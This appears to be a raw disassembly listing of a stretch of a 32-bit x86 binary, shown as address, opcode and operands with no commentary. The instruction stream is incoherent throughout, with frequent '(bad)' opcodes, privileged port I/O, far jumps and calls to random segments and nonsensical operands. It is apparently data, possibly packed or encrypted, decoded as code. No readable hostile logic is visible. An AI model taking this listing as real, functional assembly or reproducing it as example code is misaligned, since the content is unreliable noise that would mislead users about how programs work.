  404e7c:	arpl   ax,cx
  404e7e:	sti    
  404e7f:	xor    ebx,DWORD PTR [ecx+0x1a70d0ff]
  404e85:	and    BYTE PTR [ebx],ch
  404e87:	sub    edx,ebp
  404e89:	xchg   BYTE PTR [eax],ch
  404e8b:	icebp  
  404e8c:	cli    
  404e8d:	pushf  
  404e8e:	add    DWORD PTR [ebx-0x36],ecx
  404e91:	shr    BYTE PTR [esi-0xe],cl
  404e94:	jnp    0x404ebd
  404e96:	int3   
  404e97:	in     al,0xbf
  404e99:	cmp    BYTE PTR [ebx],bl
  404e9b:	mov    cl,ch
  404e9d:	adc    BYTE PTR [ebx+0x3cb01baa],al
  404ea3:	loope  0x404f1c
  404ea5:	inc    edx
  404ea6:	call   0x970f:0x941ced49
  404ead:	dec    ebx
  404eae:	add    DWORD PTR ds:0x6b449f2,esp
  404eb4:	inc    edi
  404eb5:	fcomp  QWORD PTR [edi-0xd]
  404eb8:	test   al,0x27
  404eba:	rol    al,cl
  404ebc:	stos   BYTE PTR es:[edi],al
  404ebd:	out    dx,al
  404ebe:	jae    0x404e4a
  404ec0:	fwait
  404ec1:	in     eax,0xa1
  404ec3:	xchg   esp,eax
  404ec4:	pop    esi
  404ec5:	rol    BYTE PTR [ebp+0x53adc384],0x22
  404ecc:	jno    0x404e4e
  404ece:	mov    bh,0x18
  404ed0:	cmp    edi,DWORD PTR [ebx-0x6e1cd565]
  404ed6:	push   edx
  404ed7:	fwait
  404ed8:	mov    edx,ebx
  404eda:	and    eax,0x8e49d5f8
  404edf:	movaps xmm7,XMMWORD PTR [ecx+ebx*2-0x10169a85]
  404ee7:	pop    ebx
  404ee8:	or     eax,edi
  404eea:	scas   al,BYTE PTR es:[edi]
  404eeb:	mov    ebp,0x330c5bd7
  404ef0:	loop   0x404e9e
  404ef2:	jge    0x404f3d
  404ef4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ef5:	ret    0x50e0
  404ef8:	int3   
  404ef9:	sbb    dh,dh
  404efb:	dec    edx
  404efc:	dec    ebp
  404efd:	dec    esp
  404efe:	pop    ecx
  404eff:	xchg   BYTE PTR [ecx],dh
  404f01:	push   es
  404f02:	and    eax,0xab18f5d7
  404f07:	push   cs
  404f08:	inc    eax
  404f09:	xor    al,0x79
  404f0b:	pop    ss
  404f0c:	mov    esi,0x892c6dc7
  404f11:	mov    ds:0x4eaa7307,al
  404f16:	ds push edi
  404f18:	loope  0x404ec6
  404f1a:	push   ebx
  404f1b:	rcl    DWORD PTR [edx-0x25],cl
  404f1e:	push   ecx
  404f1f:	and    al,0xed
  404f21:	and    eax,0xbf687031
  404f26:	stc    
  404f27:	sbb    al,0x5b
  404f29:	adc    al,0xc
  404f2b:	mov    ds:0x32cfd211,al
  404f30:	ja     0x404f09
  404f32:	or     al,0x32
  404f34:	scas   eax,DWORD PTR es:[edi]
  404f35:	jg     0x404f73
  404f37:	es pop eax
  404f39:	lahf   
  404f3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f3b:	inc    esi
  404f3c:	cmc    
  404f3d:	inc    esi
  404f3e:	outs   dx,BYTE PTR ds:[esi]
  404f3f:	mov    es,WORD PTR [ecx-0x52]
  404f42:	sub    bh,BYTE PTR [edi-0x13a173a8]
  404f48:	lahf   
  404f49:	stos   DWORD PTR es:[edi],eax
  404f4a:	call   0x19d1:0x70312ce3
  404f51:	mov    dh,dh
  404f53:	jg     0x404f5e
  404f55:	mov    ebx,DWORD PTR [edx+0x39]
  404f58:	mov    dl,0x65
  404f5a:	adc    ebx,0x56bad7c6
  404f60:	jmp    0x404f66
  404f62:	or     ecx,edx
  404f64:	add    DWORD PTR [edi+0x78],ebx
  404f67:	or     bh,bh
  404f69:	mov    ebp,esp
  404f6b:	push   eax
  404f6c:	or     al,0x97
  404f6e:	jmp    0x404fb1
  404f70:	aaa    
  404f71:	(bad)
  404f75:	outs   dx,BYTE PTR ds:[esi]
  404f76:	jo     0x404f76
  404f78:	js     0x404f68
  404f7a:	inc    edi
  404f7b:	imul   eax,eax,0x56
  404f7e:	addr16 pop es
  404f80:	shl    BYTE PTR [edi-0x4332ec9b],1
  404f86:	push   es
  404f87:	pusha  
  404f88:	pop    esi
  404f89:	add    ecx,edi
  404f8b:	rcl    DWORD PTR [esi-0x4a],cl
  404f8e:	pop    ebp
  404f8f:	push   edx
  404f90:	mov    ecx,0xe5a79160
  404f95:	ret    
  404f96:	xchg   dl,dl
  404f98:	mov    bh,0x93
  404f9a:	lods   al,BYTE PTR ds:[esi]
  404f9b:	cmp    ah,al
  404f9d:	xchg   esp,eax
  404f9e:	pop    ds
  404f9f:	pushf  
  404fa0:	inc    ebp
  404fa1:	push   eax
  404fa2:	lahf   
  404fa3:	fdivr  DWORD PTR [edx]
  404fa5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fa6:	(bad)  
  404fa7:	cdq    
  404fa8:	jge    0x404f50
  404faa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404fab:	jne    0x404f3d
  404fad:	imul   esp,DWORD PTR [edi],0x4d
  404fb0:	or     ch,BYTE PTR [ecx+0x50]
  404fb3:	jno    0x404ff0
  404fb5:	imul   ecx
  404fb7:	daa    
  404fb8:	xchg   DWORD PTR [edi+0x62c84683],edi
  404fbe:	outs   dx,BYTE PTR ds:[esi]
  404fbf:	loope  0x404fa3
  404fc1:	xor    al,0x8d
  404fc3:	mov    bl,0x26
  404fc5:	call   0x8568:0x4a393287
  404fcc:	(bad)  
  404fce:	ss repz retf 
  404fd1:	push   ecx
  404fd2:	aam    0x35
  404fd4:	enter  0xad13,0x9d
  404fd8:	push   0xcc62d5ce
  404fdd:	fidivr DWORD PTR [edx-0x3581684b]
  404fe3:	loopne 0x405037
  404fe5:	sub    DWORD PTR [esi+ebp*4-0x46],edx
  404fe9:	fcomi  st,st(1)
  404feb:	ret    0xdd04
  404fee:	push   cs
  404fef:	mov    ebp,0xaf54e015
  404ff4:	out    dx,eax
  404ff5:	xor    bh,dh
  404ff7:	sbb    bh,BYTE PTR [ebx+0xfc47725]
  404ffd:	jmp    0xcbbec0d9
  405002:	ss aaa 
  405004:	lods   al,BYTE PTR ds:[esi]
  405005:	fistp  QWORD PTR [esi+0x46c10b8d]
  40500b:	daa    
  40500c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40500d:	sbb    eax,0xd52b8346
  405013:	pop    edx
  405014:	xor    eax,0xa76d0533
  405019:	sub    al,0x38
  40501b:	pop    es
  40501c:	(bad)  
  40501d:	out    0xf0,eax
  40501f:	push   edx
  405020:	jmp    0x404ffd
  405022:	(bad)  
  405023:	fistp  DWORD PTR [ecx+0x37]
  405026:	sar    DWORD PTR es:[esi-0x1e],1
  40502a:	frstor [esi]
  40502c:	mov    bh,0x22
  40502e:	jp     0x405079
  405030:	dec    ecx
  405031:	jno    0x404fca
  405033:	and    eax,0x6aa672a7
  405038:	or     edi,DWORD PTR [ecx+0x35032902]
  40503e:	fcom   DWORD PTR [ebp+0x2e]
  405041:	xor    DWORD PTR [esi-0x76794d1],ebp
  405047:	push   edx
  405048:	hlt    
  405049:	pusha  
  40504a:	shl    esi,cl
  40504c:	add    esp,esp
  40504e:	add    ch,BYTE PTR [edi+0x3]
  405051:	push   ds
  405052:	je     0x405008
  405054:	jle    0x4050a7
  405056:	add    DWORD PTR [esi+eiz*8],esi
  405059:	(bad)  
  40505a:	bound  esi,QWORD PTR [eax]
  40505c:	jl     0x40501d
  40505e:	gs pop ecx
  405060:	loopne 0x405072
  405062:	in     eax,dx
  405063:	add    DWORD PTR [ecx],ecx
  405065:	add    al,0xa0
  405067:	sbb    al,BYTE PTR [ebx+0x2249586e]
  40506d:	fadd   DWORD PTR [esi-0x984f9ba]
  405073:	ja     0x405002
  405075:	add    DWORD PTR [esp+eax*4-0x2a],esp
  405079:	pushf  
  40507a:	mov    cl,0x13
  40507c:	cmp    al,0x85
  40507e:	jnp    0x40501d
  405080:	ss add al,0x22
  405083:	pop    ecx
  405084:	pop    eax
  405085:	sbb    dl,BYTE PTR [ebp+eax*8-0x723f3e5c]
  40508c:	cwde   
  40508d:	adc    al,0xe0
  40508f:	cmp    esi,DWORD PTR [ebx]
  405091:	xor    ebx,DWORD PTR [edi]
  405093:	cmp    eax,0xf2771736
  405098:	dec    ebx
  405099:	sub    al,0xa6
  40509b:	pop    esi
  40509c:	lahf   
  40509d:	lahf   
  40509e:	jmp    0x405035
  4050a0:	cwde   
  4050a1:	xchg   esp,eax
  4050a2:	adc    bh,0xce
  4050a5:	add    ecx,DWORD PTR [eax-0x31f4682f]
  4050ab:	dec    eax
  4050ac:	jle    0x4050bf
  4050ae:	sub    al,0x10
  4050b0:	sbb    DWORD PTR [ebp-0x7a],eax
  4050b3:	add    eax,0xe9f4a778
  4050b8:	in     eax,dx
  4050b9:	and    edx,DWORD PTR [edx]
  4050bb:	pop    ds
  4050bc:	or     ebp,DWORD PTR [ebx-0x29ad910f]
  4050c2:	hlt    
  4050c3:	out    dx,al
  4050c4:	jmp    0x5c43a2bf
  4050c9:	mov    esp,0x763bffc8
  4050ce:	push   edx
  4050cf:	jecxz  0x405096
  4050d1:	mov    ch,0x90
  4050d3:	xor    ah,bh
  4050d5:	adc    BYTE PTR [bx-0x1e],al
  4050d9:	or     eax,0xb1327c94
  4050de:	pop    ebp
  4050df:	dec    ebp
  4050e0:	cmp    al,0x5c
  4050e2:	push   esi
  4050e3:	sbb    edi,esi
  4050e5:	mov    ds,WORD PTR [edi]
  4050e7:	addr16 retf 0x6b27
  4050eb:	aas    
  4050ec:	and    cl,BYTE PTR [bp+si+0x30]
  4050f0:	mov    al,ds:0xfd49c6c9
  4050f5:	bound  ecx,QWORD PTR [edi]
  4050f7:	leave  
  4050f8:	div    esi
  4050fa:	inc    ebp
  4050fb:	ret    0x8cbf
  4050fe:	pop    ss
  4050ff:	mov    dh,0x64
  405101:	call   0x80c4:0x5148843c
  405108:	bound  ebp,QWORD PTR [eax+0x3c]
  40510b:	js     0x40512c
  40510d:	mov    ch,0x3
  40510f:	cld    
  405110:	out    0x2a,al
  405112:	xor    DWORD PTR [eax-0x20],eax
  405115:	fs cmc 
  405117:	dec    esp
  405118:	lds    ecx,FWORD PTR [edx-0x452da485]
  40511e:	sbb    BYTE PTR [edi+eax*8],0xce
  405122:	or     al,BYTE PTR [ebp+0xb]
  405125:	cmp    eax,0x45c2b5ca
  40512a:	int    0xa1
  40512c:	xor    DWORD PTR [edx-0x3b],ebp
  40512f:	dec    ebx
  405130:	pop    ss
  405131:	pop    ecx
  405132:	fwait
  405133:	(bad)  
  405134:	scas   eax,DWORD PTR es:[edi]
  405135:	mov    ah,cl
  405137:	adc    esi,esi
  405139:	test   DWORD PTR [edi+eax*2+0x79951076],esi
  405140:	outs   dx,DWORD PTR ds:[esi]
  405141:	mov    edx,DWORD PTR [ecx+0x14cc4ef]
  405147:	jecxz  0x4050fc
  405149:	fs aas 
  40514b:	cmp    BYTE PTR [ebx],dh
  40514d:	shr    BYTE PTR [bp+si],0x84
  405151:	ins    BYTE PTR es:[edi],dx
  405152:	sar    edi,cl
  405154:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405155:	push   ds
  405156:	inc    eax
  405157:	pusha  
  405158:	retf   0x5b22
  40515b:	test   al,0xaa
  40515d:	dec    eax
  40515e:	mov    edx,?
  405160:	popa   
  405161:	adc    dh,dl
  405163:	icebp  
  405164:	pop    esi
  405165:	stos   BYTE PTR es:[edi],al
  405166:	std    
  405167:	xor    al,0x62
  405169:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40516a:	jecxz  0x4051a2
  40516c:	gs cdq 
  40516e:	dec    edx
  40516f:	pop    edi
  405170:	or     al,0x89
  405172:	xor    DWORD PTR [ecx+0x22],esi
  405175:	push   ebp
  405176:	and    BYTE PTR [eax-0x49],dh
  405179:	cmp    eax,0x5daa6f31
  40517e:	out    dx,al
  40517f:	sbb    BYTE PTR [ebx-0x2c4c8b0a],0x7f
  405186:	std    
  405187:	ja     0x405180
  405189:	jmp    0xb7d91ba
  40518e:	outs   dx,DWORD PTR ds:[esi]
  40518f:	sbb    DWORD PTR [eax+eax*4+0x36],esi
  405193:	pop    es
  405194:	shl    BYTE PTR [edx+0x12f52fdb],cl
  40519a:	push   0xffffffda
  40519c:	in     eax,dx
  40519d:	sar    DWORD PTR [edi-0x49444c53],1
  4051a3:	inc    ebx
  4051a4:	data16 stc 
  4051a6:	mov    dl,0x5f
  4051a8:	sahf   
  4051a9:	adc    al,0x5b
  4051ab:	repnz shr BYTE PTR [eax+0x40],cl
  4051af:	(bad)  [edi+ebx*8]
  4051b2:	lock call 0x6b23:0x7696cd50
  4051ba:	pop    ebx
  4051bb:	jne    0x40519c
  4051bd:	push   ebp
  4051be:	repz scas al,BYTE PTR es:[edi]
  4051c0:	imul   esp,DWORD PTR ss:[ebp-0x7d],0x86dbf81
  4051c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051c9:	jb     0x405236
  4051cb:	adc    al,0x65
  4051cd:	sub    edx,DWORD PTR [ebx]
  4051cf:	add    DWORD PTR [ebx],edx
  4051d1:	sbb    eax,0x57ca2dd
  4051d6:	ja     0x40520e
  4051d8:	ja     0x40515e
  4051da:	fistp  WORD PTR [esi-0x23]
  4051dd:	imul   esi,DWORD PTR [ecx+0x65ef360b],0xffffff94
  4051e4:	xor    al,BYTE PTR [eax-0xd]
  4051e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051e8:	mov    eax,ds:0x89272dd3
  4051ed:	jle    0x405213
  4051ef:	(bad)  
  4051f0:	imul   ebp,DWORD PTR [ebp+0x34],0xffffffcd
  4051f4:	sub    ah,BYTE PTR [esp+ebx*1]
  4051f7:	inc    edi
  4051f8:	scas   al,BYTE PTR es:[edi]
  4051f9:	and    eax,DWORD PTR [esi]
  4051fb:	pusha  
  4051fc:	xchg   esi,eax
  4051fd:	sub    al,0xf9
  4051ff:	fld    TBYTE PTR [edx+0x50]
  405202:	dec    esi
  405203:	rcl    BYTE PTR [ebx-0x64bdfa5a],1
  405209:	lahf   
  40520a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40520b:	popa   
  40520c:	or     eax,0x6ccf0dca
  405211:	sbb    edx,ebx
  405213:	adc    bl,dh
  405215:	nop
  405216:	aad    0xc2
  405218:	sahf   
  405219:	fs mov esp,0x72b03245
  40521f:	or     BYTE PTR [ebp-0x7180f1bf],ah
  405225:	(bad)  
  405226:	xchg   DWORD PTR ds:[ebp+0x255227a],eax
  40522d:	imul   BYTE PTR [esi]
  40522f:	es pop esp
  405231:	fldcw  WORD PTR [edx]
  405233:	xchg   edi,eax
  405234:	xor    eax,0xbc46ff59
  405239:	scas   al,BYTE PTR es:[edi]
  40523a:	data16 mov ch,0xf5
  40523d:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40523f:	rol    BYTE PTR [eax+0xe],1
  405242:	push   cs
  405243:	iret   
  405244:	fdiv   QWORD PTR ds:0x8b10e001
  40524a:	jne    0x4051df
  40524c:	ss jns 0x40526f
  40524f:	add    bl,bl
  405251:	add    ch,BYTE PTR [esi-0x1b0bd6ee]
  405257:	lock xor eax,DWORD PTR [esi+eiz*2+0x2dc53b2b]
  40525f:	lds    eax,FWORD PTR [ebp+0x8]
  405262:	ror    ebx,1
  405264:	int3   
  405265:	jnp    0x4052c6
  405267:	fld    DWORD PTR [eax+0x7b]
  40526a:	mov    cl,0xa6
  40526c:	imul   esp,ecx,0x186408ee
  405272:	enter  0x34ca,0x8c
  405276:	mov    WORD PTR [eax+0x3b11c05c],cs
  40527c:	inc    edi
  40527d:	push   cs
  40527e:	mov    dl,0xf3
  405280:	out    0xb5,eax
  405282:	pop    es
  405283:	inc    edi
  405284:	into   
  405285:	mov    BYTE PTR [esi-0x23],dl
  405288:	ds int3 
  40528a:	pop    ecx
  40528b:	cwde   
  40528c:	and    eax,0xd78d4f
  405291:	call   0x8869:0x69963c02
  405298:	cmp    esp,DWORD PTR [ebx]
  40529a:	inc    eax
  40529b:	inc    esp
  40529c:	pop    ds
  40529d:	cs retf 0x4b31
  4052a1:	cld    
  4052a2:	dec    ebx
  4052a3:	cwde   
  4052a4:	or     edi,esi
  4052a6:	jae    0x40524a
  4052a8:	inc    eax
  4052a9:	outs   dx,DWORD PTR ds:[esi]
  4052aa:	adc    cl,BYTE PTR [esi+0x7dbdedf4]
  4052b0:	mov    ah,0x19
  4052b2:	ror    dl,1
  4052b4:	adc    eax,0xc6a5c811
  4052b9:	jbe    0x4052b4
  4052bb:	xor    BYTE PTR [ebx+0x20],dh
  4052be:	enter  0x12f4,0xd5
  4052c2:	adc    ah,BYTE PTR [ecx-0x78c16049]
  4052c8:	les    edi,FWORD PTR [ebx+0x67]
  4052cb:	xchg   ecx,eax
  4052cc:	in     al,0x27
  4052ce:	out    dx,eax
  4052cf:	add    esi,DWORD PTR [edx*2+0x2f0d280]
  4052d6:	adc    ebx,DWORD PTR [ebx+0x61]
  4052d9:	xchg   cl,dh
  4052db:	xor    cl,BYTE PTR [esi-0x60fe358a]
  4052e1:	jns    0x405283
  4052e3:	mov    WORD PTR [esp+ecx*2],?
  4052e6:	xor    eax,0x92f41d63
  4052eb:	sbb    dl,0x8b
  4052ee:	and    bh,BYTE PTR [ecx-0x16473b80]
  4052f4:	lds    ebp,FWORD PTR [edi+0x10548e99]
  4052fa:	xchg   esp,eax
  4052fb:	lods   eax,DWORD PTR ds:[esi]
  4052fc:	cmp    DWORD PTR [ebx],esi
  4052fe:	test   eax,0x8044c87d
  405303:	dec    edi
  405304:	add    al,0x1e
  405306:	js     0x405372
  405308:	cmp    eax,0x66873002
  40530d:	add    al,0x1
  40530f:	jg     0x405365
  405311:	retf   
  405312:	(bad)  
  405313:	(bad)  
  405314:	push   esi
  405315:	idiv   BYTE PTR [ebp+0x2d7a4616]
  40531b:	inc    edi
  40531c:	xor    bh,BYTE PTR [ebp-0x1b4bf212]
  405322:	fisttp DWORD PTR [ecx]
  405324:	push   esp
  405325:	lods   al,BYTE PTR ds:[esi]
  405326:	popa   
  405327:	sbb    DWORD PTR [ebx+0x18125072],esi
  40532d:	mov    WORD PTR [ecx],fs
  40532f:	loope  0x405332
  405331:	push   0x7bd7a8dc
  405336:	in     eax,dx
  405337:	enter  0x4c96,0xdc
  40533b:	outs   dx,BYTE PTR ds:[esi]
  40533c:	push   0x4cf4b170
  405341:	jns    0x4052d0
  405343:	jg     0x4052cf
  405345:	push   esp
  405346:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405347:	test   DWORD PTR [ebx+0xf],ecx
  40534a:	repz retf 0xb9bf
  40534e:	shr    BYTE PTR [edi-0xc873dd0],0xfb
  405355:	out    dx,eax
  405356:	lahf   
  405357:	mov    ebp,0x21398591
  40535c:	lods   al,BYTE PTR ds:[esi]
  40535d:	in     al,0x4a
  40535f:	cmc    
  405360:	sbb    al,BYTE PTR [ebx-0x725448a4]
  405366:	xchg   BYTE PTR [edx],al
  405368:	mov    ch,BYTE PTR [edi-0x1b74ec60]
  40536e:	ins    BYTE PTR es:[edi],dx
  40536f:	dec    esi
  405370:	xchg   ebx,eax
  405371:	xchg   esp,eax
  405372:	(bad)  
  405373:	jno    0x4053e6
  405375:	inc    eax
  405376:	cmc    
  405377:	jns    0x4053a4
  405379:	jne    0x40534c
  40537b:	mov    ch,0x7d
  40537d:	pop    ecx
  40537e:	and    dh,BYTE PTR [edx-0x424c75dd]
  405384:	sub    BYTE PTR [ebx+0x49564e0a],bh
  40538a:	xchg   edi,eax
  40538b:	or     ebp,DWORD PTR [edi-0x51e35d33]
  405391:	and    edi,edi
  405393:	daa    
  405394:	jmp    0x40531d
  405396:	cmp    esi,DWORD PTR [eax-0xb]
  405399:	dec    esp
  40539a:	mov    ds:0x56a58cd3,al
  40539f:	ja     0x405357
  4053a1:	mov    ds:0xda7deee6,al
  4053a6:	mov    ecx,edi
  4053a8:	(bad)  
  4053a9:	lods   al,BYTE PTR ds:[esi]
  4053aa:	mov    al,ds:0x668ba6dc
  4053af:	js     0x4053be
  4053b1:	scas   al,BYTE PTR es:[edi]
  4053b2:	mov    al,0xc9
  4053b4:	mov    al,0x28
  4053b6:	jns    0x40540a
  4053b8:	ret    0xc6e2
  4053bb:	jne    0x4053fb
  4053bd:	inc    esp
  4053be:	ja     0x4053a6
  4053c0:	sub    DWORD PTR [eax+0x7c7eaa74],edi
  4053c6:	mov    al,ds:0xc41f37f4
  4053cb:	addr16 (bad) 
  4053cd:	fisubr WORD PTR [esi+0x785bb2c2]
  4053d3:	pop    esi
  4053d4:	jmp    0xc490:0x508ee774
  4053db:	sub    edi,ebx
  4053dd:	dec    edx
  4053de:	pop    ss
  4053df:	mov    ebx,DWORD PTR [edx-0x49]
  4053e2:	pusha  
  4053e3:	xor    eax,0xc9220dde
  4053e8:	ins    DWORD PTR es:[edi],dx
  4053e9:	addr16 repz call 0x91920770
  4053f0:	or     al,0xc7
  4053f2:	ins    BYTE PTR es:[edi],dx
  4053f3:	jle    0x405398
  4053f5:	ins    DWORD PTR es:[edi],dx
  4053f6:	cli    
  4053f7:	pop    ds
  4053f8:	mov    bh,0xf4
  4053fa:	jne    0x405413
  4053fc:	mov    edi,0x704c5679
  405401:	add    al,0xe3
  405403:	xchg   ecx,eax
  405404:	mov    ah,0xca
  405406:	jmp    0x367aabb8
  40540b:	ror    BYTE PTR [edx+edi*1-0x6b38b126],cl
  405412:	dec    ecx
  405413:	repnz adc BYTE PTR [esi+0x73],dl
  405417:	mov    ch,0xb
  405419:	adc    ebx,DWORD PTR [ebp-0x69]
  40541c:	in     eax,dx
  40541d:	aaa    
  40541e:	(bad)  
  40541f:	cld    
  405420:	addr16 inc esp
  405422:	sub    ebp,DWORD PTR [edi+0x0]
  405425:	jb     0x40544c
  405427:	(bad)  
  405429:	into   
  40542a:	lock ins BYTE PTR es:[edi],dx
  40542c:	addr16 jne 0x405452
  40542f:	xor    dh,al
  405431:	dec    edi
  405432:	add    eax,ebx
  405434:	arpl   WORD PTR ds:[eax+0x3840a6d0],ax
  40543b:	imul   esi,DWORD PTR [ecx],0xef1aa6be
  405441:	jbe    0x405489
  405443:	push   es
  405444:	pop    edi
  405445:	jmp    0xfc397e94
  40544a:	mov    eax,0xd0adf343
  40544f:	push   esi
  405450:	ficomp DWORD PTR [ecx]
  405452:	pop    ebx
  405453:	das    
  405454:	clc    
  405455:	sub    DWORD PTR [eax-0x6e],0xffffff90
  405459:	cmp    DWORD PTR [edx+0x550c78e8],eax
  40545f:	fsubr  QWORD PTR [ebx-0x40ebfcf3]
  405465:	popa   
  405466:	or     eax,0xc60a55dc
  40546b:	lea    esi,[edx+0x626ef782]
  405471:	jmp    0x343c:0x654e4ee5
  405478:	lods   eax,DWORD PTR ds:[esi]
  405479:	outs   dx,DWORD PTR ds:[esi]
  40547a:	or     al,0x29
  40547c:	ins    DWORD PTR es:[edi],dx
  40547d:	jno    0x4054d5
  40547f:	loop   0x40548e
  405481:	inc    ecx
  405483:	frstor [eax+0x34308778]
  405489:	mov    bl,0x60
  40548b:	mov    edx,DWORD PTR [ecx-0x338861c8]
  405491:	pushf  
  405492:	je     0x40546b
  405494:	shl    esp,cl
  405496:	jmp    0xe349:0x40ac32e1
  40549d:	fistp  WORD PTR [ebp+edi*4+0x51]
  4054a1:	data16 fistp WORD PTR [edi]
  4054a4:	mov    bl,0x6c
  4054a6:	outs   dx,DWORD PTR ds:[esi]
  4054a7:	ficom  DWORD PTR [edi+0x6589474a]
  4054ad:	push   ecx
  4054ae:	add    al,0x25
  4054b0:	push   ss
  4054b1:	or     al,0xb7
  4054b3:	mov    edx,edi
  4054b5:	fsubr  QWORD PTR [esi+0x6af0088]
  4054bb:	xlat   BYTE PTR ds:[ebx]
  4054bc:	mov    cl,0xe1
  4054be:	std    
  4054bf:	xchg   edi,eax
  4054c0:	enter  0xe173,0xd4
  4054c4:	fld    QWORD PTR [esi]
  4054c6:	inc    ebp
  4054c7:	and    DWORD PTR [eax],esp
  4054c9:	mov    eax,0x74ac061c
  4054ce:	int    0xff
  4054d0:	test   al,0xce
  4054d2:	repnz jmp 0xbe26:0x90a9e8f1
  4054da:	push   ebx
  4054db:	jmp    0x53f0:0x878ad4bf
  4054e2:	jbe    0x40552b
  4054e4:	push   esp
  4054e5:	inc    edi
  4054e6:	jae    0x40548d
  4054e8:	mov    cl,0x43
  4054ea:	in     eax,0xb3
  4054ec:	fwait
  4054ed:	outs   dx,BYTE PTR fs:[esi]
  4054ef:	aaa    
  4054f0:	bound  ebx,QWORD PTR [ebp+0x2f]
  4054f3:	sbb    BYTE PTR [eax-0x62],dl
  4054f6:	jnp    0x40551f
  4054f8:	ins    BYTE PTR es:[edi],dx
  4054f9:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4054fb:	(bad)  
  4054fc:	rcr    BYTE PTR [ecx-0x1],1
  4054ff:	das    
  405500:	lea    edi,[esi]
  405502:	popf   
  405503:	aad    0xa1
  405505:	jle    0x405541
  405507:	test   eax,0x1445cb66
  40550c:	inc    eax
  40550d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40550e:	mov    edi,0x2bbfbd3c
  405513:	inc    ebp
  405514:	mov    dh,0xaa
  405516:	adc    al,0x77
  405518:	lahf   
  405519:	pop    edx
  40551a:	sbb    esi,edi
  40551c:	adc    al,0x80
  40551e:	xchg   BYTE PTR [eax+0x76807af7],bl
  405524:	mul    DWORD PTR [eax]
  405526:	movq   mm2,QWORD PTR [ecx]
  405529:	dec    ebp
  40552a:	dec    edi
  40552b:	mov    ds:0x906df6a5,eax
  405530:	and    al,0x3e
  405532:	push   0x0
  405534:	dec    ecx
  405535:	int    0x96
  405537:	mov    ds:0x847dad5e,al
  40553c:	int3   
  40553d:	fisubr DWORD PTR [ebx+0x3c]
  405540:	jecxz  0x405505
  405542:	cli    
  405543:	sbb    BYTE PTR [ebx+0x20721d0a],dh
  405549:	es or  edi,esp
  40554c:	adc    eax,0x8612adfe
  405551:	sub    DWORD PTR [edi-0x1a],edi
  405554:	push   edi
  405555:	push   ecx
  405556:	fadd   QWORD PTR [edx-0x6a557639]
  40555c:	int3   
  40555d:	sbb    DWORD PTR [esi-0x263d1f93],esi
  405563:	or     esi,eax
  405565:	popf   
  405566:	in     eax,dx
  405567:	xor    ebp,ebx
  405569:	pusha  
  40556a:	ins    BYTE PTR es:[edi],dx
  40556b:	add    al,0xc8
  40556d:	xchg   ecx,eax
  40556e:	dec    eax
  40556f:	pop    eax
  405570:	mov    eax,0x604c6afb
  405575:	scas   eax,DWORD PTR es:[edi]
  405576:	test   al,0x46
  405578:	push   es
  405579:	mov    esp,0x1709be01
  40557e:	mov    ebp,0x8d815c91
  405583:	les    eax,FWORD PTR [esi+0x51]
  405586:	jmp    0x405575
  405588:	aas    
  405589:	stos   DWORD PTR es:[edi],eax
  40558a:	shr    BYTE PTR [edi+0x39ebb7f9],1
  405590:	es inc ebx
  405592:	mov    ch,0xa9
  405594:	and    dl,BYTE PTR [edi+0x5d27010b]
  40559a:	scas   eax,DWORD PTR es:[edi]
  40559b:	pop    edi
  40559c:	rcl    DWORD PTR [edi-0x5e],cl
  40559f:	in     al,0xfc
  4055a1:	adc    DWORD PTR [ebx-0x54],eax
  4055a4:	std    
  4055a5:	pop    ds
  4055a6:	das    
  4055a7:	sbb    BYTE PTR [ecx+edx*4+0x3a],dl
  4055ab:	pop    ds
  4055ac:	jge    0x4055ef
  4055ae:	mov    esi,0x37f276e5
  4055b3:	sbb    DWORD PTR [edi+0x4a9e8316],ebp
  4055b9:	jb     0x405588
  4055bb:	or     al,0xc4
  4055bd:	cwde   
  4055be:	sti    
  4055bf:	mov    bh,0xcb
  4055c1:	add    dl,BYTE PTR [esp+edi*2+0x45be6fad]
  4055c8:	into   
  4055c9:	cli    
  4055ca:	into   
  4055cb:	and    bl,BYTE PTR [edx+0x38a02449]
  4055d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055d2:	adc    al,0xa
  4055d4:	xor    ah,BYTE PTR [edx-0x64721c2f]
  4055da:	dec    esi
  4055db:	pop    eax
  4055dc:	enter  0x9a68,0x53
  4055e0:	rol    DWORD PTR [esi],1
  4055e2:	push   0xfffffffe
  4055e4:	scas   al,BYTE PTR es:[edi]
  4055e5:	mov    bh,0x50
  4055e7:	cwde   
  4055e8:	and    DWORD PTR [edi+ecx*4+0x4f],esp
  4055ec:	fadd   QWORD PTR [edi+ebp*2]
  4055ef:	xchg   esp,eax
  4055f0:	es repz daa 
  4055f3:	popf   
  4055f4:	aas    
  4055f5:	loop   0x4055d1
  4055f7:	inc    eax
  4055f8:	jae    0x405651
  4055fa:	es mov cl,0x33
  4055fd:	rcr    eax,cl
  4055ff:	and    ecx,DWORD PTR [esi+ebp*4+0x40ade83c]
  405606:	outs   dx,DWORD PTR ds:[esi]
  405607:	inc    edx
  405608:	adc    BYTE PTR ds:0x862fda60,ch
  40560e:	into   
  40560f:	push   eax
  405610:	popa   
  405611:	mov    eax,ds:0x5b40a746
  405616:	(bad)  
  405617:	ror    DWORD PTR [edi],0x7e
  40561a:	mov    ds:0x8cd4b77a,al
  40561f:	test   eax,0x9475a1ed
  405624:	mov    ch,0x65
  405626:	shl    BYTE PTR [ebx],1
  405628:	iret   
  405629:	sub    al,0x67
  40562b:	test   eax,0xfe3f9eb3
  405630:	lahf   
  405631:	pusha  
  405632:	fcmovnb st,st(4)
  405634:	dec    DWORD PTR [eax+0x21989bb1]
  40563a:	rcr    DWORD PTR [ecx],1
